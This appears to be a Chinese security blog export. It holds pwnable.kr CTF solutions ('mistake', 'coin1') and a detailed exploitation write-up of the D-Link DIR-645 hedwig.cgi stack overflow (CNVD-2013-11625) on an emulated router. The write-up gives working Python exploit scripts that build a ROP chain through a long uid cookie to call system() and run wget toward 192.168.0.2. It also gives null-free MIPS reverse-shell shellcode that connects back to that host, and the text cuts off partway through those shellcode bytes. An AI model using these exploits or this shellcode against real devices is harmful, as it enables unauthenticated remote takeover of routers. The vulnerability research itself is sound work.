108400Congratz!daddy_has_lot_of_ARM_muscl3\n\nmistake查看程序源码。\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123;\tint i;\tfor(i=0; i&lt;len; i++)&#123;\t\ts[i] ^= XORKEY;\t&#125;&#125;int main(int argc, char* argv[])&#123;\t\tint fd;\tif(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)&#123;\t\tprintf(&quot;can&#x27;t open password %d\\n&quot;, fd);\t\treturn 0;\t&#125;\tprintf(&quot;do not bruteforce...\\n&quot;);\tsleep(time(0)%20);\tchar pw_buf[PW_LEN+1];\tint len;\tif(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123;\t\tprintf(&quot;read error\\n&quot;);\t\tclose(fd);\t\treturn 0;\t\t\t&#125;\tchar pw_buf2[PW_LEN+1];\tprintf(&quot;input password : &quot;);\tscanf(&quot;%10s&quot;, pw_buf2);\t// xor your input\txor(pw_buf2, 10);\tif(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123;\t\tprintf(&quot;Password OK\\n&quot;);\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag\\n&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Wrong Password\\n&quot;);\t&#125;\tclose(fd);\treturn 0;&#125;\n\n由于在 C 语言中，运算符 = 低于运算符 &lt; 的优先级，所以 fd 保存的是 open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0 的比较结果，而不是 /home/mistake/password 的文件指针。\n因此 read() 函数实际是从 stdin 中读取数据。这将使得 pw_buf 和 pw_buf2 的内容均可控，从而可以通过校验，得到 flag 信息。\nmistake@ubuntu:~$ ./mistakedo not bruteforce...BBBBBBBBBBinput password : CCCCCCCCCCPassword OKMommy_the_0perator_priority_confuses_me\n\ncoin1根据题目要求，需要在有限时间内，找出所给硬币中的假币。可以采用二分法进行计算，使用 Python 进行实现。\n#!/usr/bin/python2from pwn import *target = remote(&quot;0.0.0.0&quot;, 9007)print target.recvuntil(&quot;Ready? starting in 3 sec... -\\n&quot;)print target.recvline()for j in range(0, 100):\tdata = target.recvline()\tprint data\tstrlist = data.split(&#x27; &#x27;)\tnums = int(strlist[0][2:])\tcounts = int(strlist[1][2:])\tnum_start = 0\twhile (counts &gt; 0):\t\tif(nums == 1):\t\t\tcounts -= 1\t\t\ttarget.sendline(str(num_start))\t\t\ttarget.recvline()\t\t\tcontinue\t\tif(data == 9):\t\t\tnum_start = int(answer)\t\t\tcounts -= 1\t\t\ttarget.sendline(answer)\t\t\ttarget.recvline()\t\t\tcontinue\t\tnum_end = num_start + nums / 2\t\tweight = nums / 2 * 10\t\tanswer = &#x27;&#x27;\t\tfor i in range(num_start, num_end):\t\t\tanswer += str(i)\t\t\tanswer += &#x27; &#x27;\t\tcounts -= 1\t\ttarget.sendline(answer)\t\tdata = int(target.recvline())\t\tif(data &lt; weight):\t\t\tnums = nums / 2\t\telse:\t\t\tnums = nums - nums / 2\t\t\tnum_start = num_end\ttarget.sendline(str(num_start))\tprint target.recvline()print target.recvline()print &#x27;flag = &#x27; + target.recvline()target.close()\n\n因为题目服务器网络问题，远程运行脚本时，会经常断开连接，所以将脚本上传到题目服务器，在服务器本地运行脚本。\n经过几次运算，可以得到 flag 信息。\ncoin1@ubuntu:/tmp/coin1_test$ python2 get_flag.py[+] Opening connection to 0.0.0.0 on port 9007: Done....N=597 C=10Correct! (98)N=518 C=10Correct! (99)Congrats! get your flagflag = b1naRy_S34rch1Ng_1s_3asy_p3asy[*] Closed connection to 0.0.0.0 port 9007\n\n参考链接pwnable.kr\n","categories":["网络安全","CTF"],"tags":["CTF"]},{"title":"D-Link DIR-645 CNVD-2013-11625 漏洞分析","url":"/cybersecurity/vulnresearch/d-link-dir-645-cnvd-2013-11625-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"D-Link DIR-645 hedwig.cgi CNVD-2013-11625 漏洞分析。\n\n\n漏洞信息漏洞编号：CNVD-2013-11625\n漏洞类型：栈溢出\n漏洞组件：\n\n&#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi\n&#x2F;htdocs&#x2F;web&#x2F;authentication.cgi\n&#x2F;htdocs&#x2F;web&#x2F;post_login.xml\n\n影响范围：\n\nD-Link DIR-645 &lt;&#x3D; A1 1.03B11\n\n漏洞复现基于 D-Link DIR-645 A1 1.03B11 版本进行漏洞复现。\n连接仿真路由器 Shell 会话，关闭系统地址随机化，确保测试脚本中的 libc.so 文件基地址不变。\n------------------------------|       FirmAE Debugger      |------------------------------1. connect to socat2. connect to shell3. tcpdump4. run gdbserver5. file transfer6. exit&gt; 2Trying 192.168.0.1...Connected to 192.168.0.1.Escape character is &#x27;^]&#x27;./ # ps | grep &quot;httpd&quot; 4947 root      4976 S    httpd -f /var/run/httpd.conf  5355 root       808 S    grep httpd / # echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space/ # exitConnection closed by foreign host.\n\n编写测试脚本，在路由器中执行 wget 命令。\n#!/usr/bin/python3import structimport http.clientlibc_base_addr = 0x77F34000command = &#x27;wget http://192.168.0.2:8000/index.html&#x27;.encode(&#x27;utf-8&#x27;)payload = b&#x27;A&#x27; * 0x3EFpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000531FF)payload += b&#x27;A&#x27; * 0x10payload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000159CC)payload += b&#x27;A&#x27; * 0xCpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000158C8)payload += b&#x27;A&#x27; * 0x10payload += commandhost = &#x27;192.168.0.1&#x27;port = 80path = &#x27;/hedwig.cgi&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;,    &#x27;Cookie&#x27;: b&#x27;uid=&#x27; + payload&#125;data = &#x27;&#x27;conn = http.client.HTTPConnection(host, port).request(&#x27;POST&#x27;, path, data, headers)r = conn.getresponse()print(r.read().decode(&#x27;utf-8&#x27;))\n\n运行 NetCat 监听指定端口，接收路由器发送的 HTTP 请求。\n$ nc -lvvp 8000Listening on 0.0.0.0 8000Connection received on 192.168.0.1 46499GET /index.html/postxml HTTP/1.1Host: 192.168.0.2:8000User-Agent: Wget\n\n漏洞分析查看 hedwig.cgi 文件信息可知，该文件是一个软链接，实际指向 /htdocs/cgibin 文件。\n$ ls -l ./htdocs/web/hedwig.cgi lrwxrwxrwx 1 person person 14 Sep  5 01:08 ./htdocs/web/hedwig.cgi -&gt; /htdocs/cgibin\n\n使用 IDA 分析 /htdocs/cgibin 文件，通过字符串检索，在 main() 函数中定位到路由代码。\nif ( !strcmp(filename, &quot;hedwig.cgi&quot;) )&#123;  v8 = (int (*)())&amp;hedwigcgi_main;  v9 = argc;  return ((int (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);&#125;\n\n根据漏洞描述，问题出现在 HTTP Cookie 处理的过程中。\n\nAnother buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.\n\n通过字符串检索，在 sess_get_uid() 函数中定位到 HTTP_COOKIE 字符串的调用。\ncookie_key = (int)sobj_new();v2 = -61;cookie_value = (int)sobj_new();http_cookie = getenv(&quot;HTTP_COOKIE&quot;);if ( !cookie_key )  goto LABEL_23;\n\n分析代码可知，sess_get_uid() 函数从 Cookie 中提取 uid 字段的值，存放在参数 a1 指向的内存空间。\n  v6 = 0;  while ( 1 )  &#123;    v7 = *http_cookie_1;    if ( !*http_cookie_1 )      break;    if ( v6 == 1 )      goto LABEL_11;    if ( v6 &lt; 2 )    &#123;      if ( v7 == &#x27; &#x27; )        goto LABEL_18;      sobj_free(cookie_key);      sobj_free(cookie_value);LABEL_11:      if ( v7 == &#x27;;&#x27; )      &#123;        v6 = 0;      &#125;      else      &#123;        v6 = 2;        if ( v7 != &#x27;=&#x27; )        &#123;          sobj_add_char(cookie_key, v7);          v6 = 1;        &#125;      &#125;      goto LABEL_18;    &#125;    if ( v6 == 2 )    &#123;      if ( v7 == &#x27;;&#x27; )      &#123;        v6 = 3;        goto LABEL_18;      &#125;      sobj_add_char(cookie_value, *http_cookie_1++);    &#125;    else    &#123;      v6 = 0;      if ( !sobj_strcmp(cookie_key, &quot;uid&quot;) )        goto LABEL_21;LABEL_18:      ++http_cookie_1;    &#125;  &#125;  v2 = -61;  if ( !sobj_strcmp(cookie_key, &quot;uid&quot;) )  &#123;LABEL_21:    uid = sobj_get_string(cookie_value);    sobj_add_string(a1, (const char *)uid);    v2 = 0;  &#125;\n\n查看 sess_get_uid() 函数的引用情况，在 hedwigcgi_main() 函数中发现漏洞位置。\nchar xml_path[1024]; // [sp+C0h] [-400h] BYREF....sess_get_uid(cookie_uid);uid = (const char *)sobj_get_string(cookie_uid);sprintf(xml_path, &quot;%s/%s/postxml&quot;, &quot;/runtime/session&quot;, uid);xmldbc_del(0, 0, xml_path);\n\n从 Cookie 中取得的 uid 被直接拼接到 xml_path 字符串中，并未进行任何长度或者越界检查。由于 uid 的值和长度均可通过 HTTP 请求控制，因此此处存在栈溢出漏洞。\n漏洞利用调试进程连接仿真路由器 Shell 会话，查找 httpd 进程，并关闭系统地址随机化保护。\n------------------------------|       FirmAE Debugger      |------------------------------1. connect to socat2. connect to shell3. tcpdump4. run gdbserver5. file transfer6. exit&gt; 2Trying 192.168.0.1...Connected to 192.168.0.1.Escape character is &#x27;^]&#x27;./ # ps | grep &quot;httpd&quot; 4933 root      4976 S    httpd -f /var/run/httpd.conf  6267 root       808 S    grep httpd / # echo &quot;0&quot; &gt;&gt; /proc/sys/kernel/randomize_va_space/ # exitConnection closed by foreign host.\n\n运行 gdbserver 附加 httpd 进程。\n------------------------------|       FirmAE Debugger      |------------------------------1. connect to socat2. connect to shell3. tcpdump4. run gdbserver5. file transfer6. exit&gt; 4  PID USER       VSZ STAT COMMAND    1 root       808 S    init           2 root         0 SW   [kthreadd]    3 root         0 SW   [ksoftirqd/0].... 4883 root      1016 S    lld2d -c /var/lld2d.conf br0 ra0  4933 root      4976 S    httpd -f /var/run/httpd.conf  6946 root      1668 S    /firmadyne/busybox sleep 5  6953 root       804 S    sleep 1  6966 root       812 R    ps [+] target pid : 4933[+] gdbserver at 192.168.0.1:1337 attach on 4933[+] run &quot;target remote 192.168.0.1:1337&quot; in host gdb-multiarch\n\n运行 gdb-multiarch 连接路由器的调试端口，等待 CGI 请求。\nset architecture mipsset follow-fork-mode childset detach-on-fork offb *0x0040C010target remote 192.168.0.1:1337c\n\n发送 CGI 请求，调试器中断在 hedwigcgi_main() 函数起始位置。\n► 0x40c010 &lt;hedwigcgi_main&gt;       lui    $gp, 0x44  0x40c014 &lt;hedwigcgi_main+4&gt;     addiu  $sp, $sp, -0x4e8  0x40c018 &lt;hedwigcgi_main+8&gt;     addiu  $gp, $gp, -0x4930  0x40c01c &lt;hedwigcgi_main+12&gt;    sw     $ra, 0x4e4($sp)  0x40c020 &lt;hedwigcgi_main+16&gt;    sw     $fp, 0x4e0($sp)  0x40c024 &lt;hedwigcgi_main+20&gt;    sw     $s7, 0x4dc($sp)  0x40c028 &lt;hedwigcgi_main+24&gt;    sw     $s6, 0x4d8($sp)  0x40c02c &lt;hedwigcgi_main+28&gt;    sw     $s5, 0x4d4($sp)  0x40c030 &lt;hedwigcgi_main+32&gt;    sw     $s4, 0x4d0($sp)  0x40c034 &lt;hedwigcgi_main+36&gt;    sw     $s3, 0x4cc($sp)  0x40c038 &lt;hedwigcgi_main+40&gt;    sw     $s2, 0x4c8($sp)\n\n控制返回查看 hedwigcgi_main() 函数的结尾代码，确定 $ra 寄存器的值保存在 var_s24 中。\n.text:0040C5B8 loc_40C5B8:                              # CODE XREF: hedwigcgi_main:loc_40C59C↑j.text:0040C5B8                 lw      $ra, 0x4C0+var_s24($sp).text:0040C5BC                 move    $v0, $s7.text:0040C5C0                 lw      $fp, 0x4C0+var_s20($sp).text:0040C5C4                 lw      $s7, 0x4C0+var_s1C($sp).text:0040C5C8                 lw      $s6, 0x4C0+var_s18($sp).text:0040C5CC                 lw      $s5, 0x4C0+var_s14($sp).text:0040C5D0                 lw      $s4, 0x4C0+var_s10($sp).text:0040C5D4                 lw      $s3, 0x4C0+var_sC($sp).text:0040C5D8                 lw      $s2, 0x4C0+var_s8($sp).text:0040C5DC                 lw      $s1, 0x4C0+var_s4($sp).text:0040C5E0                 lw      $s0, 0x4C0+var_s0($sp).text:0040C5E4                 jr      $ra.text:0040C5E8                 addiu   $sp, 0x4E8\n\n根据 hedwigcgi_main() 函数的栈空间布局可知，数组 xml_path 的起始地址距离 var_s24 的偏移为 0x424 字节。\n-00000400 xml_path:       .byte 1024 dup(?)+00000000 var_s0:         .word ?+00000004 var_s4:         .word ?+00000008 var_s8:         .word ?+0000000C var_sC:         .word ?+00000010 var_s10:        .word ?+00000014 var_s14:        .word ?+00000018 var_s18:        .word ?+0000001C var_s1C:        .word ?+00000020 var_s20:        .word ?+00000024 var_s24:        .word ?\n\n因为拼接后的 xml_path 以 /runtime/session/ 开头，所以实际需要填充 0x413 字节用于覆盖 $pc 寄存器。\n编写测试脚本，用于覆盖 $pc 寄存器。\n#!/usr/bin/python3import requestspayload = &#x27;A&#x27; * 0x413payload += &#x27;BBBB&#x27;url = &#x27;http://192.168.0.1/hedwig.cgi&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;,    &#x27;Cookie&#x27;: &#x27;uid=&#x27; + payload&#125;data = &#x27;&#x27;r = requests.post(url=url, headers=headers, data=data)print(r.text)\n\n可以看到 $pc 寄存器被覆盖为指定的内容。\n*S0   0x41414141 (&#x27;AAAA&#x27;)*S1   0x41414141 (&#x27;AAAA&#x27;)*S2   0x41414141 (&#x27;AAAA&#x27;)*S3   0x41414141 (&#x27;AAAA&#x27;)*S4   0x41414141 (&#x27;AAAA&#x27;)*S5   0x41414141 (&#x27;AAAA&#x27;)*S6   0x41414141 (&#x27;AAAA&#x27;)*S7   0x41414141 (&#x27;AAAA&#x27;)*S8   0x41414141 (&#x27;AAAA&#x27;) GP   0x43b6d0 FP   0x7fff6760 ◂— &#x27;/postxml&#x27; SP   0x7fff6760 ◂— &#x27;/postxml&#x27;*PC   0x42424242 (&#x27;BBBB&#x27;)──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────Invalid address 0x42424242\n\n执行命令通过调用 libc 库中的 system 函数，可以实现执行任意命令的功能。\n查看 cgibin 文件的保护情况。\n$ checksec htdocs/cgibin[*] &#x27;/home/person/Files/_DIR645A1_FW103B11.bin.extracted/squashfs-root/htdocs/cgibin&#x27;    Arch:     mips-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX unknown - GNU_STACK missing    PIE:      No PIE (0x400000)    Stack:    Executable    RWX:      Has RWX segments\n\n查看 libuClibc-0.9.30.1.so 文件的保护情况。\n$ checksec lib/libuClibc-0.9.30.1.so[*] &#x27;/home/person/Files/_DIR645A1_FW103B11.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so&#x27;    Arch:     mips-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX unknown - GNU_STACK missing    PIE:      PIE enabled    Stack:    Executable    RWX:      Has RWX segments\n\n虽然 libuClibc-0.9.30.1.so 文件开启了 PIE 保护机制，但是仿真环境已经关闭系统地址随机化机制，所以可以忽略处理。\n在调试器中查看 cgibin 进程的内存布局，其中 libuClibc-0.9.30.1.so 模块的加载基址为 0x77F34000。\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA     Start        End Perm     Size Offset File  0x400000   0x423000 r-xp    23000      0 /htdocs/cgibin  0x433000   0x434000 rw-p     1000  23000 /htdocs/cgibin  0x434000   0x437000 rwxp     3000      0 [heap]0x77f34000 0x77f92000 r-xp    5e000      0 /lib/libuClibc-0.9.30.1.so0x77f92000 0x77fa1000 ---p     f000      0 [anon_77f92]0x77fa1000 0x77fa2000 r--p     1000  5d000 /lib/libuClibc-0.9.30.1.so0x77fa2000 0x77fa3000 rw-p     1000  5e000 /lib/libuClibc-0.9.30.1.so0x77fa3000 0x77fa8000 rw-p     5000      0 [anon_77fa3]0x77fa8000 0x77fd1000 r-xp    29000      0 /lib/libgcc_s.so.10x77fd1000 0x77fe1000 ---p    10000      0 [anon_77fd1]0x77fe1000 0x77fe2000 rw-p     1000  29000 /lib/libgcc_s.so.10x77fe2000 0x77fe7000 r-xp     5000      0 /lib/ld-uClibc-0.9.30.1.so0x77ff5000 0x77ff6000 rw-p     1000      0 [anon_77ff5]0x77ff6000 0x77ff7000 r--p     1000   4000 /lib/ld-uClibc-0.9.30.1.so0x77ff7000 0x77ff8000 rw-p     1000   5000 /lib/ld-uClibc-0.9.30.1.so0x7ffd6000 0x7fff7000 rwxp    21000      0 [stack]0x7fff7000 0x7fff8000 r-xp     1000      0 [vdso]\n\n使用 ROPgadget 在 libuClibc-0.9.30.1.so 中查找合适的利用代码。\n$ ROPgadget --binary libuClibc-0.9.30.1.so | grep &quot;move \\$t9, \\$s0 ; jalr \\$t9 ;&quot;....0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s5....\n\n将准备执行的命令写入 $sp + 0x10 指向的地址，而 system 函数地址则存放在 $s0 寄存器中，这样便可以调用 system 函数执行指定的命令。\n在 libuClibc-0.9.30.1.so 中查找 system() 函数的地址。\n.text:00053200                 .globl system  # weak.text:00053200 system:                                  # DATA XREF: LOAD:00003324↑o.text:00053200                                          # LOAD:00005084↑o.text:00053200.text:00053200 var_1C          = -0x1C.text:00053200 var_14          = -0x14.text:00053200 var_C           = -0xC\n\n由于 system() 函数的地址为 0x00053200，包含字符串截断符 0x00，所以需要采用间接的方式进行调用。\n在 MIPS 架构中，指令执行采用流水线机制，即在跳转指令执行后，其下一条指令也会执行。因此，通过利用地址加减法的方式，可以避免地址中截断符的影响。\n通过将利用脚本中 system 函数的地址减 1，再利用 ROP 指令加 1 的方式，就可以避免 payload 中 \\x00 截断符的影响。\n查找 libuClibc-0.9.30.1.so 中合适的 ROP 指令。\n$ ROPgadget --binary libuClibc-0.9.30.1.so | grep &quot;jalr \\$t9 ; addiu \\$s0&quot;....0x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1....\n\n编写测试脚本，执行系统命令。由于 requests 库不支持发送 bytes 类型数据，因此更换为 http.client 库进行发送。\n#!/usr/bin/python3import structimport http.clientlibc_base_addr = 0x77F34000command = &#x27;wget http://192.168.0.2:8000/index.html&#x27;.encode(&#x27;utf-8&#x27;)payload = b&#x27;A&#x27; * 0x3EFpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000531FF)payload += b&#x27;A&#x27; * 0x10payload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000159CC)payload += b&#x27;A&#x27; * 0xCpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000158C8)payload += b&#x27;A&#x27; * 0x10payload += commandhost = &#x27;192.168.0.1&#x27;port = 80path = &#x27;/hedwig.cgi&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;,    &#x27;Cookie&#x27;: b&#x27;uid=&#x27; + payload&#125;data = &#x27;&#x27;conn = http.client.HTTPConnection(host, port).request(&#x27;POST&#x27;, path, data, headers)r = conn.getresponse()print(r.read().decode(&#x27;utf-8&#x27;))\n\n运行 NetCat 监听指定端口，接收路由器发送的 HTTP 请求。\n$ nc -lvvp 8000Listening on 0.0.0.0 8000Connection received on 192.168.0.1 46499GET /index.html/postxml HTTP/1.1Host: 192.168.0.2:8000User-Agent: Wget\n\n执行代码通过将目标代码写入栈中内存，然后跳转到栈上执行的方式，可以实现执行任意代码的功能。\n通过之前的 gadget 代码，可以控制程序跳转到栈中地址。\n0x000159cc : addiu $s5, $sp, 0x10 ; move $a1, $s3 ; move $a2, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a0, $s50x000158c8 : move $t9, $s5 ; jalr $t9 ; addiu $s0, $s0, 1\n\n将目标代码写入 $sp + 0x10 指向的内存空间，依次经过 0x000159CC 和 0x000158C8 地址指令的执行，最终可以跳转到栈中执行目标代码。\n编写测试脚本，控制程序跳转到栈中执行。\n#!/usr/bin/python3import structimport http.clientlibc_base_addr = 0x77F34000shellcode = b&#x27;BBBB&#x27;payload = b&#x27;A&#x27; * 0x3EFpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000158C8)payload += b&#x27;A&#x27; * 0x20payload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000159CC)payload += b&#x27;A&#x27; * 0x10payload += shellcodehost = &#x27;192.168.0.1&#x27;port = 80path = &#x27;/hedwig.cgi&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;,    &#x27;Cookie&#x27;: b&#x27;uid=&#x27; + payload&#125;data = &#x27;&#x27;conn = http.client.HTTPConnection(host, port).request(&#x27;POST&#x27;, path, data, headers)r = conn.getresponse()print(r.read().decode(&#x27;utf-8&#x27;))\n\n可以看到 $pc 寄存器指向了栈空间地址，并提示此处为无效指令。\n*S0   0x77f498c9 ◂— j 0x740a8320*S1   0x41414141 (&#x27;AAAA&#x27;)*S2   0x41414141 (&#x27;AAAA&#x27;)*S3   0x41414141 (&#x27;AAAA&#x27;)*S4   0x41414141 (&#x27;AAAA&#x27;)*S5   0x7fff6760 ◂— &#x27;BBBB/postxml&#x27;*S6   0x41414141 (&#x27;AAAA&#x27;)*S7   0x41414141 (&#x27;AAAA&#x27;)*S8   0x41414141 (&#x27;AAAA&#x27;) GP   0x43b6d0*FP   0x0 SP   0x7fff6750 ◂— &#x27;AAAAAAAAAAAAAAAABBBB/postxml&#x27;*PC   0x7fff6760 ◂— &#x27;BBBB/postxml&#x27;──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────Invalid instructions at 0x7fff6760\n\n编写实现交互 Shell 的代码。\nint main()&#123;    // 创建 UDP 套接字    int s = socket(2, 2, 0);    // 重定向标准输入流    dup2(s, 0);    dup2(s, 1);    dup2(s, 2);    // 与攻击机建立连接    SOCKADDR_IN s_addr;    s_addr.sin_addr.S_un.S_addr = inet_addr(&quot;192.168.0.2&quot;);    s_addr.sin_family = AF_INET;    s_addr.sin_port = htons(8000);    connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));    // 实现交互式 Shell    execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);    return 0;&#125;\n\n转换为 mips32 架构的汇编代码。\n; int s = socket(2, 2, 0);li $a0, 0x2li $a1, 0x2li $a2, 0x0li $v0, 0x1057syscall 0x40404sw $v0, 0x1E0($sp); dup2(s, 0); dup2(s, 1); dup2(s, 2);lw $a0, 0x1E0($sp)li $a1, 0x0li $v0, 0xFDFsyscall 0x40404li $a1, 0x1li $v0, 0xFDFsyscall 0x40404li $a1, 0x2li $v0, 0xFDFsyscall 0x40404; connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));lui $t6, 0x401Fori $t6, $t6, 0x0002sw $t6, 0x1E4($sp)lui $t6, 0x0200ori $t6, $t6, 0xA8C0sw $t6, 0x1E8($sp)lw $a0, 0x1E0($sp)la $a1, 0x1E4($sp)li $a2, 0x10li $v0, 0x104Asyscall 0x40404; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);lui $t1, 0x6E69ori $t1, $t1, 0x622Fsw $t1, 0x1E8($sp)lui $t1, 0x0068ori $t1, $t1, 0x732Fsw $t1, 0x1EC($sp)lui $t1, 0x0ori $t1, $t1, 0x692Dsw $t1, 0x1F0($sp)la $t1, 0x1E8($sp)sw $t1, 0x1E0($sp)la $t1, 0x1F0($sp)sw $t1, 0x1E4($sp)la $a0, 0x1E8($sp)la $a1, 0x1E0($sp)li $a2, 0x0li $v0, 0xFABsyscall 0x40404\n\n为了防止汇编代码对应的十六进制数据存在 \\x00 字节，所以对代码进行优化。\n; int s = socket(2, 2, 0);li $a0, 0x2223addi $a0, $a0, -0x2221li $a1, 0x2223addi $a1, $a1, -0x2221li $a2, 0x2223addi $a2, $a2, -0x2223li $v0, 0x1057syscall 0x40404sw $v0, 0x1E0($sp); dup2(s, 0); dup2(s, 1); dup2(s, 2);lw $a0, 0x1E0($sp)li $a1, 0x2223addi $a1, $a1, -0x2223li $v0, 0xFDFsyscall 0x40404li $a1, 0x2223addi $a1, $a1, -0x2222li $v0, 0xFDFsyscall 0x40404li $a1, 0x2223addi $a1, $a1, -0x2221li $v0, 0xFDFsyscall 0x40404; connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));lui $t6, 0x401Fori $t6, $t6, 0x0303addi $t6, $t6, -0x0301sw $t6, 0x1E4($sp)lui $t6, 0x0303ori $t6, $t6, 0xA9C1addi $t6, $t6, -0x01030101sw $t6, 0x1E8($sp)lw $a0, 0x1E0($sp)la $a1, 0x1E4($sp)li $a2, 0x2223addi $a2, $a2, -0x2213li $v0, 0x104Asyscall 0x40404; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);lui $t6, 0x6E69ori $t6, $t6, 0x622Fsw $t6, 0x1E0($sp)lui $t6, 0x0169ori $t6, $t6, 0x7430addi $t6, $t6, -0x01010101sw $t6, 0x1E4($sp)lui $t6, 0x6E69ori $t6, $t6, 0x622Fsw $t6, 0x1F4($sp)lui $t6, 0x0169ori $t6, $t6, 0x7430addi $t6, $t6, -0x01010101sw $t6, 0x1F8($sp)lui $t6, 0x0101ori $t6, $t6, 0x6A2Eaddi $t6, $t6, -0x01010101sw $t6, 0x1FC($sp)la $t6, 0x1F4($sp)sw $t6, 0x1E8($sp)la $t6, 0x1FC($sp)sw $t6, 0x1EC($sp)sw $zero, 0x1EC($sp)la $a0, 0x1E0($sp)la $a1, 0x1E8($sp)slti $a2, $zero, -1li $v0, 0xFABsyscall 0x40404\n\n由于 lui $t1, 0x6E69 对应的十六进制数据 \\x69\\x6e\\x09\\x3c 中的 \\x09 字节会被程序替换为 \\x20 字节，因此改用 $t6 寄存器。\n通过 Online Assembler and Disassembler 网站将汇编代码转换为十六进制数据。\n# int s = socket(2, 2, 0);shellcode += b&quot;\\x23\\x22\\x04\\x24\\xdf\\xdd\\x84\\x20\\x23\\x22\\x05\\x24\\xdf\\xdd\\xa5\\x20\\x23\\x22\\x06\\x24\\xdd\\xdd\\xc6\\x20\\x57\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xe0\\x01\\xa2\\xaf&quot;# dup2(s, 0); dup2(s, 1); dup2(s, 2);shellcode += b&quot;\\xe0\\x01\\xa4\\x8f\\x23\\x22\\x05\\x24\\xdd\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x23\\x22\\x05\\x24\\xde\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x23\\x22\\x05\\x24\\xdf\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01&quot;# connect(s, (SOCKADDR*)s_addr, sizeof(SOCKADDR));shellcode += b&quot;\\x1f\\x40\\x0e\\x3c\\x03\\x03\\xce\\x35\\xff\\xfc\\xce\\x21\\xe4\\x01\\xae\\xaf\\x03\\x03\\x0e\\x3c\\xc1\\xa9\\xce\\x35\\xfc\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xe8\\x01\\xae\\xaf\\xe0\\x01\\xa4\\x8f\\xe4\\x01\\xa5\\x27\\x23\\x22\\x06\\x24\\xed\\xdd\\xc6\\x20\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01&quot;# execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, &quot;-i&quot;], 0);shellcode += 